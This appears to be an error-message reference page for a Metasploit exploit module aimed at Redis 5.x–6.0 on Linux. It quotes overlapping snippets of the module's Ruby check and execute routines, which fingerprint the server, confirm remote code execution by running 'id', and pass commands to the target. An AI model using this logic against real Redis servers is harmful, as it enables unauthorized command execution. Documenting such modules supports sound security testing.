+Unaffected operating system
+
+Here is a relevant code snippet related to the "Unaffected operating system" error message:
+
+142:	    #
+143:	    # We could probably fingerprint the build_id as well, but I'm worried I'll overlook at
+144:	    # package somewhere and it's nice to get final verification via exploitation anyway.
+145:	    info_output = redis_command('INFO')
+146:	    return Exploit::CheckCode::Unknown('Failed authentication.') if info_output.nil?
+147:	    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+
+redis_git_sha1:00000000
+
+Here is a relevant code snippet related to the "redis_git_sha1:00000000" error message:
+
+143:	    # We could probably fingerprint the build_id as well, but I'm worried I'll overlook at
+144:	    # package somewhere and it's nice to get final verification via exploitation anyway.
+145:	    info_output = redis_command('INFO')
+146:	    return Exploit::CheckCode::Unknown('Failed authentication.') if info_output.nil?
+147:	    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+
+Could not extract a version number
+
+Here is a relevant code snippet related to the "Could not extract a version number" error message:
+
+146:	    return Exploit::CheckCode::Unknown('Failed authentication.') if info_output.nil?
+147:	    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+154:	    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+
+The reported version is unaffected: <REDIS_VERSION>
+
+Here is a relevant code snippet related to the "The reported version is unaffected: <REDIS_VERSION>" error message:
+
+147:	    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+154:	    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+157:	    result = do_popen('id')
+
+The reported version is unaffected: <REDIS_VERSION>
+
+Here is a relevant code snippet related to the "The reported version is unaffected: <REDIS_VERSION>" error message:
+
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+154:	    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+157:	    result = do_popen('id')
+158:	    return Exploit::CheckCode::Vulnerable("Successfully executed the 'id' command.") unless result.nil? || result[/uid=.+ gid=.+ groups=.+/].nil?
+
+Unsupported architecture
+
+Here is a relevant code snippet related to the "Unsupported architecture" error message:
+
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+152:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+154:	    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+157:	    result = do_popen('id')
+158:	    return Exploit::CheckCode::Vulnerable("Successfully executed the 'id' command.") unless result.nil? || result[/uid=.+ gid=.+ groups=.+/].nil?
+159:	
+
+Successfully executed the 'id' command.
+
+Here is a relevant code snippet related to the "Successfully executed the 'id' command." error message:
+
+153:	    return Exploit::CheckCode::Safe("The reported version is unaffected: #{redis_version}") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')
+154:	    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+157:	    result = do_popen('id')
+158:	    return Exploit::CheckCode::Vulnerable("Successfully executed the 'id' command.") unless result.nil? || result[/uid=.+ gid=.+ groups=.+/].nil?
+159:	
+160:	    Exploit::CheckCode::Safe("Could not execute 'id' on the remote target.")
+161:	  ensure
+162:	    disconnect
+163:	  end
+
+Could not execute 'id' on the remote target.
+
+Here is a relevant code snippet related to the "Could not execute 'id' on the remote target." error message:
+
+155:	
+156:	    # okay, looks like a worthy candidate. Attempt exploitation.
+157:	    result = do_popen('id')
+158:	    return Exploit::CheckCode::Vulnerable("Successfully executed the 'id' command.") unless result.nil? || result[/uid=.+ gid=.+ groups=.+/].nil?
+159:	
+160:	    Exploit::CheckCode::Safe("Could not execute 'id' on the remote target.")
+161:	  ensure
+162:	    disconnect
+163:	  end
+164:	
+165:	  def execute_command(cmd, _opts = {})
+
+The server did not respond
+
+Here is a relevant code snippet related to the "The server did not respond" error message:
+
+165:	  def execute_command(cmd, _opts = {})
+166:	    connect
+167:	
+168:	    # force the redis mixin to handle auth for us
+169:	    info_output = redis_command('INFO')
+170:	    fail_with(Failure::NoAccess, 'The server did not respond') if info_output.nil?
+171:	
+172:	    # escape any single quotes
+173:	    cmd = cmd.gsub("'", "\\\\'")
+174:	
+175:	    # On success, there is no meaningful response. I think this is okay because we already have
+
+The server did not respond as expected: <RESP>
+
+Here is a relevant code snippet related to the "The server did not respond as expected: <RESP>" error message:
+
+173:	    cmd = cmd.gsub("'", "\\\\'")
+174:	
+175:	    # On success, there is no meaningful response. I think this is okay because we already have
+176:	    # solid proof of execution in check.
+177:	    resp = do_os_exec(cmd)
+178:	    fail_with(Failure::UnexpectedReply, "The server did not respond as expected: #{resp}") unless resp.nil? || resp.include?('$-1')
+179:	    print_good('Exploit complete!')
+180:	  ensure
+181:	    disconnect
+182:	  end
+183:	
+
+Go back to menu.
